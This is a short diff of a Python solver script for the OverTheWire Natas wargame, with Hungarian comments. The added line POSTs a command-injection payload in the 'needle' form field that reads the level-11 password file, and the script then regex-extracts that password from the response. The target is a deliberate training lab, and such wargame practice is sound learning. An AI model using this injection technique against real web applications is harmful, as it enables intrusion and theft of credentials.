@@ -16,10 +16,10 @@ url = 'http://%s.natas.labs.overthewire.org/' % username
 #print(session)
 
 #reponse = requests.get(url, auth=(username, password), headers=headers)
-reponse = requests.get(url , auth=(username, password))
+#reponse = requests.get(url , auth=(username, password))
 
 #POST kérés
-#reponse = requests.post(url, data={"needle": ". cat /etc/natas_webpass/natas10","submit": "submit"}, auth=(username, password))
+reponse = requests.post(url, data={"needle": ". cat /etc/natas_webpass/natas11 #","submit": "submit"}, auth=(username, password))
 
 #a sessionhoz hozárendelt get kérés
 #reponse = session.get(url, auth=(username, password), cookies=cookie_)
@@ -30,6 +30,6 @@ content = reponse.text
 #print(session.cookies['loggedin'])
 
 #keresés a tartalomban. A (.*) a helyettesítő karakter. ami itt van az eredetiban azt figyelman kívül fogja hagyni.
-#print(re.findall('natas10(.*)' ,content))
+print(re.findall('natas11(.*)' ,content))
 
-print(content)
+#print(content)
